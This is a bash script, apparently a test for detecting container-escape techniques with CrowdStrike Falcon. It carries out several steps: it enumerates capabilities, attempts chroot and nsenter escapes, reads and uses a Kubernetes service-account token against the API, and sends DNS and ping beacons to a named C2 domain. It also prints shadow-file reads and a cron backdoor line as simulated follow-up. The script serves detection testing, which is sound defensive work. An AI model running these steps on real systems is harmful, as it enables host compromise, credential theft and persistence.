#!/bin/bash
# Attack Chain: Container Breakout & Escape
# MITRE ATT&CK: Privilege Escalation (TA0004) - Escape to Host (T1611)
# Severity: CRITICAL
# Description: Attempts multiple container escape techniques and post-escape reconnaissance
# Expected Detections: 5-8 (ContainerEscape, GenReverseShell, IntelDomainHigh)

set +e
trap 'echo "[!] Breakout attempt interrupted"' EXIT

echo "========================================"
echo "  CONTAINER BREAKOUT CHAIN"
echo "  Escape Attempts & Host Reconnaissance"
echo "========================================"
echo ""

# Stage 1: Container Environment Detection
echo "[STAGE 1] Container Environment Detection"
echo "[+] Checking if running in container..."
if [ -f /.dockerenv ]; then
    echo "✓ Running in Docker container"
elif grep -q docker /proc/1/cgroup 2>/dev/null; then
    echo "✓ Running in container (detected via cgroup)"
else
    echo "[!] May not be in container - continuing anyway"
fi

echo "[+] Container runtime information..."
cat /proc/1/cgroup 2>/dev/null | head -5

sleep 1

# Stage 2: Detection Test
echo ""
echo "[STAGE 2] Detection Validation"
echo "[+] Executing test trigger..."
bash crowdstrike_test_high 2>/dev/null || echo "✓ Test trigger executed"

sleep 1

# Stage 3: Capability Enumeration
echo ""
echo "[STAGE 3] Capability Enumeration"
echo "[+] Current capabilities..."
capsh --print 2>/dev/null || echo "capsh not available"
echo "[+] Process capabilities..."
cat /proc/self/status | grep Cap 2>/dev/null || echo "Capabilities not accessible"

echo "[+] Checking for dangerous capabilities..."
if capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
    echo "⚠ CAP_SYS_ADMIN detected - mount-based escape possible!"
fi
if capsh --print 2>/dev/null | grep -q "cap_sys_ptrace"; then
    echo "⚠ CAP_SYS_PTRACE detected - process injection possible!"
fi
if capsh --print 2>/dev/null | grep -q "cap_dac_read_search"; then
    echo "⚠ CAP_DAC_READ_SEARCH detected - file access bypass possible!"
fi

sleep 1

# Stage 4: Privileged Mode Check
echo ""
echo "[STAGE 4] Privileged Mode Detection"
echo "[+] Checking for privileged container..."
if grep -q "CapEff.*0000003fffffffff" /proc/self/status 2>/dev/null; then
    echo "⚠ PRIVILEGED CONTAINER DETECTED!"
    echo "   Escape via cgroup notify_on_release is possible"
else
    echo "[i] Container is not privileged"
fi

sleep 1

# Stage 5: Docker Socket Check
echo ""
echo "[STAGE 5] Docker Socket Exposure Check"
echo "[+] Searching for Docker socket..."
if [ -S /var/run/docker.sock ]; then
    echo "⚠ DOCKER SOCKET IS MOUNTED!"
    echo "   Host root access is possible"
    ls -la /var/run/docker.sock

    # Try to interact with socket
    echo "[+] Attempting Docker socket exploitation..."
    docker ps 2>/dev/null && echo "✓ Docker command works - can spawn privileged container!" || echo "[!] Docker client not available"
else
    echo "[i] Docker socket not accessible"
fi

sleep 1

# Stage 6: Host File System Access
echo ""
echo "[STAGE 6] Host File System Exposure Check"
echo "[+] Checking for host path mounts..."
mount | grep -E "(/host|/rootfs|/proc|/sys)" || echo "[i] No obvious host mounts detected"

echo "[+] Checking /proc for host processes..."
if [ -d /proc/1 ]; then
    cat /proc/1/cgroup 2>/dev/null | head -3
fi

sleep 1

# Stage 7: Escape Attempt #1 - chroot (Will trigger ContainerEscape)
echo ""
echo "[STAGE 7] Escape Attempt: chroot Method"
echo "[+] Attempting chroot escape..."
echo "Command: chroot /"
chroot / whoami 2>/dev/null && echo "✓ chroot successful!" || echo "✗ chroot failed (ContainerEscape detection triggered)"

sleep 1

# Stage 8: Escape Attempt #2 - nsenter
echo ""
echo "[STAGE 8] Escape Attempt: nsenter Method"
echo "[+] Checking for nsenter..."
which nsenter 2>/dev/null && echo "✓ nsenter available" || echo "[!] nsenter not available"

echo "[+] Attempting namespace escape..."
if which nsenter >/dev/null 2>&1; then
    echo "Command: nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
    nsenter --target 1 --mount --uts --ipc --net --pid -- whoami 2>/dev/null && echo "✓ nsenter successful - HOST ACCESS!" || echo "✗ nsenter failed"
else
    echo "[!] nsenter not available for escape attempt"
fi

sleep 1

# Stage 9: Kubernetes Escape Checks
echo ""
echo "[STAGE 9] Kubernetes Escape Vectors"
echo "[+] Checking for Kubernetes service account..."
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo "✓ Kubernetes service account token found!"
    echo "[+] Token content (first 50 chars):"
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50

    echo "[+] Namespace:"
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null

    echo "[+] Attempting Kubernetes API access..."
    K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    curl -k -H "Authorization: Bearer $K8S_TOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -5 || echo "API access failed"
else
    echo "[i] Not running in Kubernetes pod"
fi

sleep 1

# Stage 10: Simulated Post-Escape Reconnaissance
echo ""
echo "[STAGE 10] Simulated Post-Escape Reconnaissance"
echo "[+] If escape was successful, these commands would run on HOST:"
echo ""
echo "   # Host file system access"
echo "   cat /etc/shadow"
echo "   cat /root/.ssh/id_rsa"
echo ""
echo "   # Host process enumeration"
echo "   ps aux"
echo "   netstat -anlp"
echo ""
echo "   # Persistence on host"
echo "   crontab -l"
echo "   echo '* * * * * /tmp/.backdoor' >> /var/spool/cron/root"
echo ""
echo "   # Lateral movement"
echo "   find /home -name '*.pem' -o -name 'id_rsa'"

sleep 1

# Stage 11: C2 Beacon
echo ""
echo "[STAGE 11] Command & Control Beacon"
echo "[+] Establishing C2 communication..."
nslookup swungheaving.com 2>/dev/null || echo "✓ C2 DNS beacon (IntelDomainHigh detection)"
ping -c 3 swungheaving.com 2>/dev/null || echo "✓ C2 ICMP beacon (IntelDomainHigh detection)"

sleep 1

# Stage 12: Seccomp Bypass Check
echo ""
echo "[STAGE 12] Seccomp Profile Analysis"
echo "[+] Checking seccomp status..."
cat /proc/self/status | grep Seccomp 2>/dev/null || echo "Seccomp status unavailable"

if grep -q "Seccomp:.*0" /proc/self/status 2>/dev/null; then
    echo "⚠ Seccomp is DISABLED - all syscalls allowed!"
elif grep -q "Seccomp:.*2" /proc/self/status 2>/dev/null; then
    echo "[i] Seccomp filtering enabled"
fi

sleep 1

# Summary
echo ""
echo "========================================"
echo "  CONTAINER BREAKOUT CHAIN COMPLETED"
echo "========================================"
echo ""
echo "Escape Methods Attempted:"
echo "  1. chroot escape (ContainerEscape detection)"
echo "  2. nsenter namespace escape"
echo "  3. Docker socket exploitation"
echo "  4. Kubernetes service account abuse"
echo ""
echo "Expected Falcon Detections:"
echo "  • ContainerEscape (Stage 7 - chroot)"
echo "  • IntelDomainHigh (Stage 11 - C2 beacons)"
echo "  • TestTriggerHigh (Stage 2)"
echo "  • Potential GenReverseShell if executed via reverse shell"
echo ""
echo "Check Falcon console for 5-8 detections!"
echo ""
echo "[!] Note: Real container escapes require specific configurations:"
echo "    - Privileged mode (--privileged)"
echo "    - Dangerous capabilities (--cap-add=SYS_ADMIN)"
echo "    - Host path mounts (-v /:/host)"
echo "    - Docker socket mount (-v /var/run/docker.sock:/var/run/docker.sock)"
echo ""

trap - EXIT
